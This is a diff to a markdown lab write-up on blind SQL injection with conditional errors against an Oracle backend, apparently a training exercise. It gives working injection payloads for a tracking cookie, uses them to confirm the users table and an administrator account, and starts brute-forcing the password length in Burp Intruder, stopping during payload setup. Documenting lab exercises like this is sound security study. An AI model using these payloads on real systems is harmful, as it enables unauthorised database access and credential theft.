@@ -33,6 +33,10 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8'
 
 **Note** - If the SQL query causes an error, then the application returns a custom error message.
 
+**Checking the above note by putting single quote**
+![[blind_SQL_injection_conditional_errors3.png]]
+From above we can clearly say that it is vulnerable to sql injection.
+
 2. Now, we need to check the version of the database used:
 ```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '') || '
@@ -40,7 +44,7 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (
 
 Below performing on burp:
 ![[blind_SQL_injection_conditional_errors1.png]]
-- We need to use "FROM" keyword along with the oracle built-in table which is "dual"
+- We need to use "FROM" keyword along with the oracle built-in table which is "dual".
 
 query - 
 ```sql 
@@ -49,3 +53,82 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (
 
 Below performing on burp:
 ![[blind_SQL_injection_conditional_errors2.png]]
+**Result** - Database is oracle.
+
+3. Now, we are going to confirm that the **users** table exist in the database.
+query -
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users) || '
+```
+
+Below performing on burp:
+![[blind_SQL_injection_conditional_errors4.png]]
+**Reason** - The **users** table might be have more than one entry, which just break our query. that's why we need to define that to output only one row from **users** table.
+
+query - 
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users WHERE rownum=1) || '
+```
+
+Below performing on burp again:
+![[blind_SQL_injection_conditional_errors5.png]]
+**Result** - `users` does exist in database.
+
+4. Now, we are going to confirm that **administrator** user exist in the database.
+query - 
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT '' FROM users WHERE username=administrator) || '
+```
+
+Below performing on burp:
+![[blind_SQL_injection_conditional_errors6.png]]
+However, this wouldn't really tell you that **administrator** user exist.
+**Reason** - When you search for any other and that user doesn't even exist then this query doesn't even run the **SELECT** statement code and give **200** status code.
+![[blind_SQL_injection_conditional_errors7.png]]
+user - a23strasdfator but the resulted status code is **200**.
+
+**We need to check the existence of administrator user on the basis of  generating error messages**
+query - 
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+```
+**Explaination to above query**
+The **FROM** clause evaluates first and then **SELECT** clause evaluate. So, the **FROM** clause is wrong(doesn't give you any result) then **SELECT** clause doesn't even evaluates.
+**For the above query** - If the `administrator` user exist then **SELECT** clause run otherwise it doesn't even run.
+
+##### Checking the existence of administrator user with the above query
+query - 
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+```
+
+Below performing on burp:
+![[blind_SQL_injection_conditional_errors8.png]]
+Now, we need to make sure that the **SELECT** clause is running or not by just changing **(1=1)** to **(1=0)**. So that we can get **200** status code
+![[blind_SQL_injection_conditional_errors9.png]]
+**Result** - administrator user is exist in the database.
+
+**Let's with the user that doesn't exist**
+![[blind_SQL_injection_conditional_errors10.png]]
+**Reason** - We get **200** status code because **SELECT** doesn't even evaluates and also the reason is because this **asdf23XXX** doesn't even exist in the database.
+
+5. Now, we are going to determine the length of the password.
+query -
+```sql 
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'QczaHz170LHEUUE8' ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>1) || '
+```
+We are going to perform the above step on intruder because it help us to perform brute force.
+
+Below on performing burp:
+1. Checking the length of password on **Repeater**:
+![[blind_SQL_injection_conditional_errors11.png]]
+**Reason for 200 status code** - **SELECT** clause doesn't even run because **FROM** clause is wrong.
+
+2. Sending the query to intruder:
+![[blind_SQL_injection_conditional_errors12.png]]
+
+3. Seting up the positions in the position section of intruder
+![[blind_SQL_injection_conditional_errors13.png]]
+
+4. Setting up the payload. 
+![[blind_SQL_injection_conditional_errors14.png]]
